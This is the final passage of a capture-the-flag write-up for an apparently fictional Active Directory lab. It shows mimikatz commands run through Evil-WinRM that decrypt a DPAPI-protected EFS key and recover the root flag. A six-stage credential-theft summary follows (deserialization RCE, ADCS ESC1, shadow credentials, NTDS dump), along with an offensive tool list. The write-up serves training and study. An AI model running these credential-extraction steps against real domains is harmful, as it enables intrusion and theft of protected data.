*Evil-WinRM* PS C:\Users\m.luffy\Documents> dir C:\Users\m.luffy\AppData\Roaming\Microsoft\Crypto\RSA\S-1-5-21-2847392816-1295834720-3948571062-1103\
```

```
    Directory: C:\Users\m.luffy\AppData\Roaming\Microsoft\Crypto\RSA\S-1-5-21-2847392816-1295834720-3948571062-1103

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         1/15/2026  10:30 AM           2344 f7e6d5c4b3a29180
```

Decrypt the EFS private key using the decrypted master key:

```powershell
*Evil-WinRM* PS C:\Users\m.luffy\Documents> C:\temp\mimikatz.exe "dpapi::capi /in:C:\Users\m.luffy\AppData\Roaming\Microsoft\Crypto\RSA\S-1-5-21-2847392816-1295834720-3948571062-1103\f7e6d5c4b3a29180 /masterkey:[HASH REDACTED]" "exit"
```

```
mimikatz(commandline) # dpapi::capi /in:... /masterkey:...

Private key file       : C:\Users\m.luffy\AppData\Roaming\Microsoft\Crypto\RSA\S-1-5-21-...\f7e6d5c4b3a29180
[*] Using masterkey to decrypt
[*] Private key decrypted successfully
[*] Exported to: raw_exchange_capi_0_f7e6d5c4b3a29180.pvk

mimikatz(commandline) # exit
```

### Decrypting root.txt

With the EFS private key now exported, use mimikatz's `crypto::decrypt` or load the key into the user context to decrypt:

```powershell
*Evil-WinRM* PS C:\Users\m.luffy\Documents> C:\temp\mimikatz.exe "privilege::debug" "crypto::certificates /systemstore:local_machine /export" "dpapi::capi /in:C:\Users\m.luffy\AppData\Roaming\Microsoft\Crypto\RSA\S-1-5-21-2847392816-1295834720-3948571062-1103\f7e6d5c4b3a29180 /masterkey:[HASH REDACTED]" "exit"
```

Alternatively, using the decrypted PVK to build a PFX and decrypt with `cipher`:

```powershell
*Evil-WinRM* PS C:\Users\m.luffy\Documents> certutil -importpfx C:\temp\m.luffy_efs.pfx
*Evil-WinRM* PS C:\Users\m.luffy\Documents> cipher /d C:\Users\m.luffy\Desktop\root.txt
```

```
 Decrypting files in C:\Users\m.luffy\Desktop\
root.txt         [OK]
1 file(s) [or directorie(s)] within 1 directorie(s) were decrypted.
```

```powershell
*Evil-WinRM* PS C:\Users\m.luffy\Documents> type C:\Users\m.luffy\Desktop\root.txt
GM{k1ng_0f_th3_p1r4t3s_f0und_th3_0n3_p13c3}
```

---

## Credentials Summary

```
Stage 1 — Initial Access (svc_web)
────────────────────────────────────────────────────────────────
svc_web         : [Deser RCE]              → IIS App Pool (no SeImpersonate)

Stage 2 — Lateral Movement (nami)
────────────────────────────────────────────────────────────────
nami            : [REDACTED]               → MSSQL sysadmin (web.config)

Stage 3 — ADCS ESC1 (r.zoro)
────────────────────────────────────────────────────────────────
r.zoro          : [NTLM] [HASH REDACTED]   → Certificate impersonation via PKINIT

Stage 4 — Shadow Credentials (s.vinsmoke)
────────────────────────────────────────────────────────────────
s.vinsmoke      : [NTLM] [HASH REDACTED]   → Backup Operators (GenericWrite → Shadow Creds)

Stage 5 — NTDS Dump (m.luffy)
────────────────────────────────────────────────────────────────
m.luffy         : [NTLM] [HASH REDACTED]   → Domain Admin (SeBackupPrivilege → NTDS)
Administrator   : [NTLM] [HASH REDACTED]   → Domain Admin (NTDS dump)

Stage 6 — EFS Decrypt
────────────────────────────────────────────────────────────────
m.luffy         : [DPAPI Backup Key]       → EFS decryption via domain backup key
```

---

## Tools Used

- **Nmap** — Port scanning and service enumeration
- **Kerbrute** — Kerberos username enumeration
- **ysoserial.net** — .NET deserialization payload generation (ObjectDataProvider gadget)
- **Impacket** — mssqlclient.py (MSSQL), secretsdump.py (NTDS dump), GetNPUsers.py (ASREPRoast), GetUserSPNs.py (Kerberoast)
- **Certipy** — ADCS enumeration, ESC1 certificate request, PKINIT authentication, Shadow Credentials
- **BloodHound / bloodhound-python** — Active Directory attack path analysis
- **NetExec (nxc)** — SMB/LDAP enumeration, credential validation, DACL reading
- **Evil-WinRM** — WinRM shell access with pass-the-hash
- **DiskShadow** — Volume Shadow Copy creation for NTDS.dit extraction
- **Mimikatz** — DPAPI backup key extraction, master key decryption, EFS private key recovery
- **Robocopy** — File copy with backup privileges (/B flag)

---

## References

- [HackTricks - Newtonsoft.Json Deserialization](https://book.hacktricks.xyz/pentesting-web/deserialization#json.net-.net)
- [ysoserial.net — JSON.Net Gadgets](https://github.com/pwntester/ysoserial.net)
- [HackTricks - ADCS ESC1](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation#esc1)
- [Certipy Documentation](https://github.com/ly4k/Certipy)
- [Shadow Credentials Attack](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab)
- [Backup Operators to Domain Admin](https://www.hackingarticles.in/windows-privilege-escalation-backup-operators/)
- [DPAPI Backup Key & EFS Decryption](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/dpapi-extracting-passwords)
- [DiskShadow for NTDS Extraction](https://bohops.com/2018/03/26/diskshadow-the-return-of-vss-evasion-persistence-and-active-directory-database-extraction/)
